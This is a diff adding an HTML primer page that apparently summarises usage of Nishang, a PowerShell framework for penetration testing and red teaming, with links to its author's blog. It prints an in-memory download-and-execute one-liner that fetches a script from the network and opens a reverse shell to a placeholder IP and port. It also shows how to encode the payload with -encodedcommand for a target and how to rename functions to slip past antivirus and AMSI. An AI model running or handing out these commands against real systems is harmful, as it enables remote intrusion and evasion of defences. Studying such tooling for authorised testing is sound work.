@@ -1,0 +1,57 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>General Primer</title>
+</head><body>http://www.labofapenetrationtester.com/<br/>
+<br/>
+<a href="http://www.labofapenetrationtester.com/2014/06/nishang-0-3-4.html">http://www.labofapenetrationtester.com/2014/06/nishang-0-3-4.html</a>&nbsp;<br/>
+<a href="http://labofapenetrationtester.com/2012/08/introducing-nishang-powereshell-for.html">http://labofapenetrationtester.com/2012/08/introducing-nishang-powereshell-for.html</a>&nbsp;<br/>
+<a href="http://labofapenetrationtester.com/2013/08/powerpreter-and-nishang-Part-1.html">http://labofapenetrationtester.com/2013/08/powerpreter-and-nishang-Part-1.html</a>&nbsp;<br/>
+<a href="http://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html">http://www.labofapenetrationtester.com/2013/09/powerpreter-and-nishang-Part-2.html</a>&nbsp;<br/>
+<br/>
+All about Nishang<br/>
+<a href="http://www.labofapenetrationtester.com/search/label/Nishang">http://www.labofapenetrationtester.com/search/label/Nishang</a>&nbsp;<br/>
+<br/>
+Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing. &nbsp;<br/>
+<br/>
+<br/>
+Usage<br/>
+Import all the scripts in the current PowerShell session (PowerShell v3 onwards).<br/>
+PS C:\nishang&gt; Import-Module .\nishang.psm1<br/>
+<br/>
+Use the individual scripts with dot sourcing.<br/>
+PS C:\nishang&gt; . C:\nishang\Gather\Get-Information.ps1<br/>
+PS C:\nishang&gt; Get-Information<br/>
+<br/>
+To get help about any script or function, use:<br/>
+PS C:\nishang&gt; Get-Help [scriptname] -full<br/>
+<br/>
+Note that the help is available for the function loaded after running the script and not the script itself since version 0.3.8. In all cases, the function name is same as the script name.<br/>
+<br/>
+For example, to see the help about Get-WLAN-Keys.ps1, use<br/>
+PS C:\nishang&gt; . C:\nishang\Get-WLAN-Keys.ps1<br/>
+PS C:\nishang&gt; Get-Help Get-WLAN-Keys -Full<br/>
+<br/>
+Anti Virus<br/>
+Nishang scripts are flagged by many Anti Viruses as malicious. The scrripts on a target are meant to be used in memory which is very easy to do with PowerShell. Two basic methods to execute PowerShell scripts in memory:<br/>
+<br/>
+Method 1. Use the in-memory dowload and execute: Use below command to execute a PowerShell script from a remote shell, meterpreter native shell, a web shell etc. and the function exported by it. All the scripts in Nishang export a function with same name in the current PowerShell session.<br/>
+<br/>
+powershell iex (New-Object Net.WebClient).DownloadString('http:///Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]<br/>
+<br/>
+Method 2. Use the -encodedcommand (or -e) parameter of PowerShell All the scripts in Nishang export a function with same name in the current PowerShell session. Therefore, make sure the function call is made in the script itself while using encodedcommand parameter from a non-PowerShell shell. For above example, add a function call (without quotes) "Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]".<br/>
+<br/>
+Encode the scrript using Invoke-Encode from Nishang:<br/>
+PS C:\nishang&gt; . \nishang\Utility\Invoke-Encode<br/>
+PS C:\nishang&gt; Invoke-Encode -DataToEncode C:\nishang\Shells\Invoke-PowerShellTcp.ps1 -OutCommand<br/>
+<br/>
+Encoded data written to .\encoded.txt<br/>
+Encoded command written to .\encodedcommand.txt<br/>
+<br/>
+From above, use the encoded script from encodedcommand.txt and run it on a target where commands could be executed (a remote shell, meterpreter native shell, a web shell etc.). Use it like below:<br/>
+C:\Users\target&gt; powershell -e [encodedscript]<br/>
+<br/>
+If the scripts still get detected changing the function and parameter names and removing the help content will help.<br/>
+<br/>
+In case Windows 10's AMSI is still blocking script execution, see this blog: http://www.labofapenetrationtester.com/2016/09/amsi.html</body></html>
